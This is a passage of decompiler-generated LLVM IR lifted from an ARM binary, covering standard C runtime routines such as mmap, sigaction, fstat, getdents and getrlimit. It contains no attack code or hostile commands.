  store i1 %v9_152f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152f0, label %dec_label_pc_152f8, label %dec_label_pc_152f0.dec_label_pc_152bc_crit_edge

dec_label_pc_152f0.dec_label_pc_152bc_crit_edge:  ; preds = %dec_label_pc_152f0
  %v0_152bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_152bc

dec_label_pc_152f8:                               ; preds = %dec_label_pc_152f0
  %v2_152f8 = icmp ne i32 %v1_152f0, 0
  store i1 %v2_152f8, i1* %cpsr_c.global-to-local, align 1
  %v7_152f8 = icmp eq i32 %v1_152f0, 1
  store i1 %v7_152f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_152f8, label %dec_label_pc_15338, label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_152f8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %dec_label_pc_152f8, %dec_label_pc_15300, %dec_label_pc_15250
  %storemerge2 = phi i32 [ %v0_15294, %dec_label_pc_15250 ], [ 0, %dec_label_pc_15300 ], [ 0, %dec_label_pc_152f8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1533c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1533c, i32* %r0.global-to-local, align 4
  %v0_15340 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15340, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_15338
  %v2_15344 = load i32, i32* @r8, align 4
  %v8_15344 = shl i32 %v2_15344, %v1_1533c
  %v9_15344 = and i32 %v8_15344, %v1_1533c
  %v8_15348 = lshr i32 %v2_15344, %v9_15344
  %v9_15348 = and i32 %v8_15348, %v9_15344
  %v2_1534c = inttoptr i32 %v9_15348 to i64*
  %v3_1534c = load i64, i64* %v2_1534c, align 4
  %v5_1534c = trunc i64 %v3_1534c to i32
  %v6_1534c = udiv i64 %v3_1534c, 4294967296
  %v7_1534c = trunc i64 %v6_1534c to i32
  store i32 %v5_1534c, i32* %r1.global-to-local, align 4
  %v9_1534c = sub i32 %v7_1534c, %v2_15344
  %v1_15350 = load i32, i32* %r4.global-to-local, align 4
  %v3_15350 = mul i32 %v9_1534c, %v1_15350
  %v5_15358 = mul i32 %v1_15350, 4
  %v5_1535c = udiv i32 %v1_15350, 2
  %v6_15358 = and i32 %v5_1535c, %v5_15358
  %v6_1535c = and i32 %v6_15358, %v3_15350
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1535c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15338, %bb85
  %v5_15360 = phi i32 [ %v1_1533c, %dec_label_pc_15338 ], [ %v6_1535c, %bb85 ]
  ret i32 %v5_15360

; uselistorder directives
  uselistorder i32 %v1_15350, { 1, 0, 2 }
  uselistorder i32 %v1_1533c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_152f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_152ec, { 1, 0, 2 }
  uselistorder i32 %v1_152d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152bc, { 1, 0 }
  uselistorder i32 %v2_1521c, { 1, 0 }
  uselistorder i32 %v2_151f4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_151e8, { 1, 0 }
  uselistorder i32 %v1_151e4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_151d8, { 1, 0 }
  uselistorder i32 %v1_151a4, { 1, 0 }
  uselistorder i32 %v1_151a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15194, { 1, 0 }
  uselistorder i32 %v2_15170, { 1, 0, 2 }
  uselistorder i32 %v4_15154, { 1, 0, 2 }
  uselistorder i32 %v4_15144, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1508c, { 1, 2, 0 }
  uselistorder i32 %v2_15058, { 1, 2, 0 }
  uselistorder i32 %v1_15054, { 1, 2, 0 }
  uselistorder i1 %v2_15040, { 1, 0, 2 }
  uselistorder i32 %v5_15044, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15010, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14ff8, { 1, 0, 2 }
  uselistorder i32 %v2_14fec, { 1, 0, 2 }
  uselistorder i32 %v3_14fbc, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 6, 7, 8, 9, 10, 12, 11, 14, 15, 16, 13, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 8, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15338, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152d8, { 1, 0 }
  uselistorder label %dec_label_pc_15240, { 1, 0 }
  uselistorder label %dec_label_pc_15218, { 1, 0 }
  uselistorder label %dec_label_pc_15194, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150e8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15058, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15040, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1538c = load i32, i32* @r4, align 4
  store i32 %v3_1538c, i32* %stack_var_-16, align 4
  %v3_15398 = urem i32 %arg3, 4096
  %v2_1539c = icmp eq i32 %v3_15398, 0
  br i1 %v2_1539c, label %dec_label_pc_153c0, label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %entry
  %v0_153a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_153a8, i32* %r0.global-to-local, align 4
  %v3_153ac = load i16, i16* @global_var_22294.357, align 2
  %v4_153ac = sext i16 %v3_153ac to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_153b8 = add i32 %v4_153ac, %v0_153a8
  %v4_153b8 = inttoptr i32 %v3_153b8 to i32*
  store i32 22, i32* %v4_153b8, align 4
  %v0_153f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153f4

dec_label_pc_153c0:                               ; preds = %entry
  %v0_153d0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_153d0, -4095
  br i1 %tmp, label %dec_label_pc_153f0, label %dec_label_pc_153d8

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153c0
  %v1_153dc = sub i32 0, %v0_153d0
  %v3_153e0 = load i16, i16* @global_var_22294.357, align 2
  %v4_153e0 = sext i16 %v3_153e0 to i32
  %v0_153e4 = call i32 @__aeabi_read_tp()
  %v3_153e8 = add i32 %v4_153e0, %v0_153e4
  %v4_153e8 = inttoptr i32 %v3_153e8 to i32*
  store i32 %v1_153dc, i32* %v4_153e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153c0, %dec_label_pc_153d8
  %v0_153f0 = phi i32 [ %v0_153d0, %dec_label_pc_153c0 ], [ -1, %dec_label_pc_153d8 ]
  store i32 %v0_153f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153f4

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153a4, %dec_label_pc_153f0
  %v0_153f4 = phi i32 [ %v0_153f4.pre, %dec_label_pc_153a4 ], [ %v0_153f0, %dec_label_pc_153f0 ]
  store i32 %v0_153f4, i32* %r0.global-to-local, align 4
  %v2_153f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_153f8, i32* @r4, align 4
  ret i32 %v0_153f4

; uselistorder directives
  uselistorder i32 %v0_153f4, { 1, 0 }
  uselistorder i32 %v0_153d0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_153f4, { 1, 0 }
  uselistorder label %dec_label_pc_153f0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_15408 = load i32, i32* @lr, align 4
  store i32 %v0_15408, i32* %stack_var_-4, align 4
  %v0_15410 = load i32, i32* @r0, align 4
  %v3_15414 = load i16, i16* @global_var_22294.357, align 2
  %v4_15414 = sext i16 %v3_15414 to i32
  store i32 %v4_15414, i32* @r2, align 4
  %v0_15418 = call i32 @__aeabi_read_tp()
  %v1_1541c = sub i32 0, %v0_15410
  store i32 %v1_1541c, i32* @r3, align 4
  %v2_15420 = load i32, i32* @r2, align 4
  %v3_15420 = add i32 %v2_15420, %v0_15418
  %v4_15420 = inttoptr i32 %v3_15420 to i32*
  store i32 %v1_1541c, i32* %v4_15420, align 4
  %v2_15428 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15428, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15434 = load i32, i32* @r4, align 4
  %v6_15434 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1543c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1543c, label %dec_label_pc_15490, label %dec_label_pc_15454

dec_label_pc_15454:                               ; preds = %entry
  %v1_15454 = add i32 %arg2, 4
  %v2_15454 = inttoptr i32 %v1_15454 to i32*
  %v3_15454 = load i32, i32* %v2_15454, align 4
  store i32 %v3_15454, i32* @r3, align 4
  %v1_15458 = and i32 %v3_15454, 67108864
  %v2_15458 = icmp eq i32 %v1_15458, 0
  br i1 %v2_15458, label %dec_label_pc_15460, label %dec_label_pc_15490

dec_label_pc_15460:                               ; preds = %dec_label_pc_15454
  store i32 20, i32* @r2, align 4
  %v2_15464 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15464, i32* @r0, align 4
  %v0_15468 = call i32 @memcpy()
  %v0_15490.pre = load i32, i32* @r5, align 4
  %v0_15498.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15490

dec_label_pc_15490:                               ; preds = %dec_label_pc_15454, %entry, %dec_label_pc_15460
  %v0_15498 = phi i32 [ %arg3, %dec_label_pc_15454 ], [ %arg3, %entry ], [ %v0_15498.pre, %dec_label_pc_15460 ]
  %v0_15494 = phi i32 [ %arg2, %dec_label_pc_15454 ], [ 0, %entry ], [ %v2_15464, %dec_label_pc_15460 ]
  %v0_15490 = phi i32 [ %arg1, %dec_label_pc_15454 ], [ %arg1, %entry ], [ %v0_15490.pre, %dec_label_pc_15460 ]
  %v4_154a0 = call i32 @__syscall_rt_sigaction(i32 %v0_15490, i32 %v0_15494, i32 %v0_15498, i32 8)
  store i32 %v3_15434, i32* @r4, align 4
  store i32 %v6_15434, i32* @r5, align 4
  ret i32 %v4_154a0

; uselistorder directives
  uselistorder label %dec_label_pc_15490, { 2, 0, 1 }
}

define i32 @function_154b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_154b4:
  %v0_154b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_154b4
  %v2_154b4 = load i32, i32* @r8, align 4
  %v4_154b4 = mul i32 %v2_154b4, 2
  %v5_154b4 = and i32 %v4_154b4, %arg1
  %v2_154b8 = load i32, i32* @ip, align 4
  %v4_154b8 = lshr i32 %v2_154b8, %v5_154b4
  %v5_154b8 = sub i32 32, %v5_154b4
  %v6_154b8 = shl i32 %v2_154b8, %v5_154b8
  %v7_154b8 = or i32 %v6_154b8, %v4_154b8
  %v9_154b8 = and i32 %v7_154b8, %v5_154b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_154b4, %bb
  %v10_154b8 = phi i32 [ %arg1, %dec_label_pc_154b4 ], [ %v9_154b8, %bb ]
  ret i32 %v10_154b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_154c0 = call i32 @__sigsetjmp()
  ret i32 %v0_154c0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154f0 = load i32, i32* @r7, align 4
  store i32 %v3_154f0, i32* %stack_var_-8, align 4
  %v0_154fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154fc, -4095
  br i1 %tmp, label %dec_label_pc_15524, label %dec_label_pc_1550c

dec_label_pc_1550c:                               ; preds = %entry
  %v0_15510 = call i32 @__aeabi_read_tp()
  %v3_15514 = load i16, i16* @global_var_22294.357, align 2
  %v4_15514 = sext i16 %v3_15514 to i32
  %v0_15518 = load i32, i32* %r2.global-to-local, align 4
  %v1_15518 = sub i32 0, %v0_15518
  store i32 %v1_15518, i32* %r2.global-to-local, align 4
  %v3_1551c = add i32 %v4_15514, %v0_15510
  %v4_1551c = inttoptr i32 %v3_1551c to i32*
  store i32 %v1_15518, i32* %v4_1551c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15524.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15524

dec_label_pc_15524:                               ; preds = %entry, %dec_label_pc_1550c
  %v1_15528 = phi i32 [ %v0_154fc, %entry ], [ -1, %dec_label_pc_1550c ]
  %v2_15524 = phi i32 [ %v3_154f0, %entry ], [ %v2_15524.pre, %dec_label_pc_1550c ]
  store i32 %v2_15524, i32* @r7, align 4
  ret i32 %v1_15528

; uselistorder directives
  uselistorder i32 %v0_154fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15524, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_15568, %dec_label_pc_1557c, %entry
  %v0_1553c = phi i32 [ %arg1, %entry ], [ %v0_1553c.pre.pre, %dec_label_pc_1557c ], [ %v0_15568, %dec_label_pc_15568 ]
  store i32 %v0_1553c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1553c, -4095
  br i1 %tmp, label %dec_label_pc_15568, label %dec_label_pc_15558

dec_label_pc_15558:                               ; preds = %dec_label_pc_1553c
  %v0_15558 = call i32 @__aeabi_read_tp()
  %v0_1555c = load i32, i32* %r2.global-to-local, align 4
  %v1_1555c = sub i32 0, %v0_1555c
  store i32 %v1_1555c, i32* %r2.global-to-local, align 4
  %v3_15560 = load i16, i16* @global_var_22294.357, align 2
  %v4_15560 = sext i16 %v3_15560 to i32
  %v3_15564 = add i32 %v4_15560, %v0_15558
  %v4_15564 = inttoptr i32 %v3_15564 to i32*
  store i32 %v1_1555c, i32* %v4_15564, align 4
  %v0_15568.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15568

dec_label_pc_15568:                               ; preds = %dec_label_pc_1553c, %dec_label_pc_15558
  %v0_15568 = phi i32 [ %v0_1553c, %dec_label_pc_1553c ], [ %v0_15568.pre, %dec_label_pc_15558 ]
  store i32 %v0_15568, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15568, -4095
  br i1 %tmp4, label %dec_label_pc_1553c, label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15568
  %v0_1557c = call i32 @__aeabi_read_tp()
  %v0_15580 = load i32, i32* %r2.global-to-local, align 4
  %v1_15580 = sub i32 0, %v0_15580
  store i32 %v1_15580, i32* %r2.global-to-local, align 4
  %v3_15584 = load i16, i16* @global_var_22294.357, align 2
  %v4_15584 = sext i16 %v3_15584 to i32
  %v3_15588 = add i32 %v4_15584, %v0_1557c
  %v4_15588 = inttoptr i32 %v3_15588 to i32*
  store i32 %v1_15580, i32* %v4_15588, align 4
  %v0_1553c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1553c

; uselistorder directives
  uselistorder i32 %v0_15568, { 0, 2, 1 }
  uselistorder i32 %v0_1553c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15568, { 1, 0 }
  uselistorder label %dec_label_pc_1553c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_155a0 = load i32, i32* @r1, align 4
  store i32 %v0_155a0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_155b0 = load i32, i32* @r0, align 4
  store i32 %v0_155b0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_155b0, -4095
  br i1 %tmp, label %dec_label_pc_155d8, label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %entry
  %v0_155c0 = call i32 @__aeabi_read_tp()
  %v3_155c4 = load i16, i16* @global_var_22294.357, align 2
  %v4_155c4 = sext i16 %v3_155c4 to i32
  store i32 %v4_155c4, i32* @r3, align 4
  %v0_155c8 = load i32, i32* @r2, align 4
  %v1_155c8 = sub i32 0, %v0_155c8
  store i32 %v1_155c8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_155d0 = add i32 %v4_155c4, %v0_155c0
  %v4_155d0 = inttoptr i32 %v3_155d0 to i32*
  store i32 %v1_155c8, i32* %v4_155d0, align 4
  br label %dec_label_pc_155e8

dec_label_pc_155d8:                               ; preds = %entry
  store i32 %v0_155b0, i32* %r7.global-to-local, align 4
  %v2_155d8 = icmp eq i32 %v0_155b0, 0
  br i1 %v2_155d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_155d8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_155d8, %bb
  call void @__pseudo_cond_branch(i1 %v2_155d8, i32 ptrtoint (i32* @global_var_15a28.596 to i32))
  br label %dec_label_pc_155e8

dec_label_pc_155e8:                               ; preds = %dec_label_pc_155bc, %.thread
  %v0_155e8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_155e8

; uselistorder directives
  uselistorder i32 %v0_155b0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_155e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_155fc = load i32, i32* @r5, align 4
  %v18_155fc = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15634, label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %entry
  %v1_1561c = sub i32 0, %arg1
  %v3_15620 = load i16, i16* @global_var_22294.357, align 2
  %v4_15620 = sext i16 %v3_15620 to i32
  store i32 %v4_15620, i32* %r3.global-to-local, align 4
  %v0_15624 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1562c = add i32 %v4_15620, %v0_15624
  %v4_1562c = inttoptr i32 %v3_1562c to i32*
  store i32 %v1_1561c, i32* %v4_1562c, align 4
  br label %dec_label_pc_15688

dec_label_pc_15634:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15634
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1563c = add i32 %arg2, %arg1
  store i32 %v3_1563c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15634, %bb
  %v1_156784 = phi i32 [ %v18_155fc, %dec_label_pc_15634 ], [ %v3_1563c, %bb ]
  %v0_156742 = phi i32 [ 141, %dec_label_pc_15634 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_15688, label %dec_label_pc_15674

dec_label_pc_15648:                               ; preds = %dec_label_pc_15674
  %v1_1567c = inttoptr i32 %v1_15674 to i8*
  %v1_15648 = add i32 %v0_15648, 8
  %v2_15648 = inttoptr i32 %v1_15648 to i16*
  %v3_15648 = load i16, i16* %v2_15648, align 2
  %v4_15648 = zext i16 %v3_15648 to i32
  %v2_1564c = add i32 %v4_15648, %v0_15648
  store i32 %v2_1564c, i32* @r3, align 4
  %v1_15650 = add i32 %v2_1564c, -1
  %v2_15650 = inttoptr i32 %v1_15650 to i8*
  %v3_15650 = load i8, i8* %v2_15650, align 1
  %v4_15650 = zext i8 %v3_15650 to i32
  store i32 %v4_15650, i32* @r4, align 4
  %v3_15654 = call i32 @strlen(i8* %v1_1567c)
  %v0_15658 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15658, i32* @r1, align 4
  %v1_1565c = add i32 %v3_15654, 1
  store i32 %v1_1565c, i32* @r2, align 4
  %v0_15660 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15660, i32* @r0, align 4
  %v3_15664 = call i32 @memmove(i32 %v0_15660, i32 %v0_15658, i32 %v1_1565c)
  %v0_15668 = load i32, i32* %r7.global-to-local, align 4
  %v1_15668 = add i32 %v0_15668, 8
  %v2_15668 = inttoptr i32 %v1_15668 to i16*
  %v3_15668 = load i16, i16* %v2_15668, align 2
  %v4_15668 = zext i16 %v3_15668 to i32
  store i32 %v4_15668, i32* %r3.global-to-local, align 4
  %v0_1566c = load i32, i32* @r4, align 4
  %v1_1566c = trunc i32 %v0_1566c to i8
  %v3_1566c = add i32 %v0_15668, 10
  %v4_1566c = inttoptr i32 %v3_1566c to i8*
  store i8 %v1_1566c, i8* %v4_1566c, align 1
  %v0_15670 = load i32, i32* %r7.global-to-local, align 4
  %v1_15670 = load i32, i32* %r3.global-to-local, align 4
  %v2_15670 = add i32 %v1_15670, %v0_15670
  store i32 %v2_15670, i32* %r7.global-to-local, align 4
  %v1_15678.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15674

dec_label_pc_15674:                               ; preds = %.thread, %dec_label_pc_15648
  %v1_15678 = phi i32 [ %v1_15678.pre, %dec_label_pc_15648 ], [ %v1_156784, %.thread ]
  %v0_15648 = phi i32 [ %v2_15670, %dec_label_pc_15648 ], [ %v0_156742, %.thread ]
  %v1_15674 = add i32 %v0_15648, 10
  store i32 %v1_15674, i32* %r6.global-to-local, align 4
  %v3_15678 = icmp ult i32 %v0_15648, %v1_15678
  %v1_15680 = add i32 %v0_15648, 11
  store i32 %v1_15680, i32* %r8.global-to-local, align 4
  br i1 %v3_15678, label %dec_label_pc_15648, label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %dec_label_pc_15674, %.thread, %dec_label_pc_15618
  %v0_15688 = load i32, i32* @r5, align 4
  store i32 %v6_155fc, i32* @r5, align 4
  store i32 %v18_155fc, i32* @sl, align 4
  ret i32 %v0_15688

; uselistorder directives
  uselistorder i32 %v1_15674, { 1, 0 }
  uselistorder i32 %v0_15648, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_155fc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15674, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_156a0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_156ac = call i32 @getrlimit(i32 7, i32 %v2_156a0)
  %v1_156b0 = icmp slt i32 %v2_156ac, 0
  %v5_156b4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_156b0, i32 256, i32 %v5_156b4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_156d8 = load i32, i32* @r0, align 4
  ret i32 %v1_156d8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_156ec = load i32, i32* @r0, align 4
  ret i32 %v1_156ec
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15700 = load i32, i32* @r0, align 4
  ret i32 %v1_15700
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_15710 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 148) to i32*), align 4
  %v1_15714 = inttoptr i32 %v4_15710 to i32*
  %v2_15714 = load i32, i32* %v1_15714, align 4
  %v2_15718 = icmp eq i32 %v2_15714, 0
  br i1 %v2_15718, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_15720 = phi i32 [ %v2_15714, %entry ], [ 4096, %bb ]
  ret i32 %v1_15720

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15758, label %dec_label_pc_15740

dec_label_pc_15740:                               ; preds = %entry
  %v1_15744 = sub i32 0, %arg1
  %v3_15748 = load i16, i16* @global_var_22294.357, align 2
  %v4_15748 = sext i16 %v3_15748 to i32
  %v0_1574c = call i32 @__aeabi_read_tp()
  %v3_15750 = add i32 %v4_15748, %v0_1574c
  %v4_15750 = inttoptr i32 %v3_15750 to i32*
  store i32 %v1_15744, i32* %v4_15750, align 4
  br label %dec_label_pc_15758

dec_label_pc_15758:                               ; preds = %entry, %dec_label_pc_15740
